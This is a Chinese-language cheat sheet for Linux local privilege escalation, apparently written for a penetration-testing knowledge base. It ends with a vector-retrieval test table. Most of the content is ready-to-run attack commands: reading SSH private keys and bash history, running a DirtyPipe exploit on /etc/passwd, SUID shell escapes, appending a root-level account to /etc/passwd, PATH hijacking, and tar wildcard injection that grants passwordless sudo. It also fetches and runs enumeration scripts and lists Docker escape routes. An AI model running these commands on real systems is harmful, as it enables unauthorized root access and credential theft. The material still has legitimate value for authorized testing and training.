```
# Linux 本地提权速查表

## 常用信息收集命令

```bash
# 当前用户身份
id
whoami
sudo -l

# 系统版本与内核
uname -a
cat /etc/os-release
cat /etc/issue

# 进程与定时任务
ps aux
crontab -l
ls -la /etc/cron*

# 可写文件与 SUID
find / -perm -4000 -type f 2>/dev/null
find / -writable -type f 2>/dev/null | grep -v proc

# 历史命令与配置文件
cat ~/.bash_history
cat ~/.ssh/id_rsa
cat /etc/passwd | grep /bin/bash
```



## 内核漏洞提权

| 漏洞编号                      | 影响版本              | 利用特点                   |
| :---------------------------- | :-------------------- | :------------------------- |
| **DirtyPipe (CVE-2022-0847)** | Linux 5.8 ~ 5.16.11   | 可覆盖任意只读文件，极稳定 |
| DirtyCow (CVE-2016-5195)      | Linux 2.6.22 ~ 4.8.3  | 竞争条件，较老但经典       |
| CVE-2021-3156 (Baron Samedit) | sudo 1.8.2 ~ 1.8.31p2 | 堆溢出，通杀多版本         |

### DirtyPipe 利用示例

bash

```
# 下载 exp
gcc -o dirtypipe exploit.c
./dirtypipe /etc/passwd
# 将 root:x:0:0 写回，然后 su root
```



## SUID 提权常用二进制

bash

```
# 查找 SUID 文件
find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null

# 常见可利用程序
/usr/bin/find
/usr/bin/vi / vim
/usr/bin/bash
/usr/bin/sudo
/usr/bin/pkexec
/usr/bin/cp
```



### 利用示例

bash

```
# find 提权
find / -exec /bin/sh \; -quit

# vim 提权
vim -c ':!/bin/sh'

# cp 覆盖 /etc/passwd
cp /etc/passwd /tmp/passwd
echo "root2:$(openssl passwd -1 123456):0:0:root:/root:/bin/bash" >> /tmp/passwd
cp /tmp/passwd /etc/passwd
su root2
```



## 环境变量劫持（PATH 注入）

bash

```
# 检查 PATH 中可写目录
echo $PATH

# 创建恶意 cat
echo '/bin/sh' > /tmp/cat
chmod +x /tmp/cat
export PATH=/tmp:$PATH
# 等待特权脚本调用 cat
```



## 定时任务与通配符注入

bash

```
# 查看 root 执行的定时任务
cat /etc/crontab

# 通配符注入 (tar 配合 --checkpoint)
cd /tmp
echo 'echo "root ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers' > run.sh
echo "" > "--checkpoint=1"
echo "" > "--checkpoint-action=exec=sh run.sh"
# 等待 root 执行 tar -cf backup.tar *
```



## 工具辅助

- **LinPEAS**：自动化信息收集

  bash

  ```
  wget https://github.com/carlospolop/PEASS-ng/releases/download/20240414/linpeas.sh
  chmod +x linpeas.sh
  ./linpeas.sh
  ```

  

- **linux-exploit-suggester**：内核漏洞建议

  bash

  ```
  wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh
  bash linux-exploit-suggester.sh
  ```

  

## 容器逃逸（如果处于 Docker）

- 挂载宿主机根目录：`docker run -v /:/host ...`
- 特权容器：`--privileged` 可直接 `fdisk -l`
- 利用 CVE-2019-5736 (runc 漏洞)

**注意**：提权前先记录系统时间，避免执行破坏性操作。优先尝试 **CVE-2022-0847 (DirtyPipe)**，因为它影响面广且利用简单。

text

```
---

## 测试验证

现在你有了以下 8 个文档：
- 信息收集_端口扫描与服务识别.md
- Web漏洞_SQL注入绕过WAF.md
- 提权_Windows本地提权速查表.md
- 域渗透_横向移动方法汇总.md
- 免杀_基础免杀与代码混淆.md
- 报告编写_渗透测试报告模板.md
- 内网渗透_隧道搭建与代理转发.md
- **提权_Linux本地提权速查表.md** (新增)

### 向量检索预期结果

| 用户问题 | 应命中的文档/内容 |
|---------|------------------|
| "Windows 提权" | 提权_Windows... → Mimikatz, PrintNightmare |
| "Linux 内核漏洞" | 提权_Linux... → DirtyPipe, CVE-2022-0847 |
| "如何在不出网的内网中横向移动" | 域渗透_横向移动... → WMI, PsExec, WinRM |
| "隧道搭建" | 内网渗透_隧道... → SSH, frp, Chisel |
| "绕过WAF" | Web漏洞_SQL注入... → 注释符, 编码, HPP |
```